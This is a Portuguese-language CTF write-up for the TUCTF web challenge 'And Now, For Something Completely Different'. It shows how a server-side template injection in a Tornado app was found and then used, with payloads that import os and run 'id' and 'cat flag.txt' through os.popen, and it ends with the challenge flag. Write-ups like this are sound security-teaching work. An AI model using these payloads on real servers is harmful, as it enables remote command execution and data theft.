# And Now, For \<br> Something Completely \<br> Different

**Categoria: Web**

# Descrição:
>We all know Black Friday is the time for shopping. Can you find us a flag on this online store?

>chal.tuctf.com:30007
![AndNowForSomethingCompletelyDifferent - Chall](andnow0.png)

# Solução:
Acessando o link:
![AndNowForSomethingCompletelyDifferent - Página Web](andnow1.png)
Analisando o código fonte encontramos um diretório:
![AndNowForSomethingCompletelyDifferent - Diretório encontrado](andnow2.png)
E, acessando o "/welcome/test", temos:
![AndNowForSomethingCompletelyDifferent - Diretório welcome](andnow3.png)
Depois de testar alguns paylods, cheguei ao Server-Side Template Injection (SSTI), com o payload {{7*7}}:
![AndNowForSomethingCompletelyDifferent - SSTI 49](andnow4.png)
E descobri que estava rodando Tornado no servidor, pois em uns dos payloads que eu testei me retornou um erro com o path do Tornado e assim procurei outros payloads para o Tornado.

Usei: {% import os %}{{ os.popen("id").read() }}
![AndNowForSomethingCompletelyDifferent - SSTI id](andnow5.png)
E assim, obti a flag, com o payload: {% import os %}{{ os.popen("cat flag.txt").read() }}
![AndNowForSomethingCompletelyDifferent - SSTI flag](andnow6.png)

# Flag:
```TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465}```

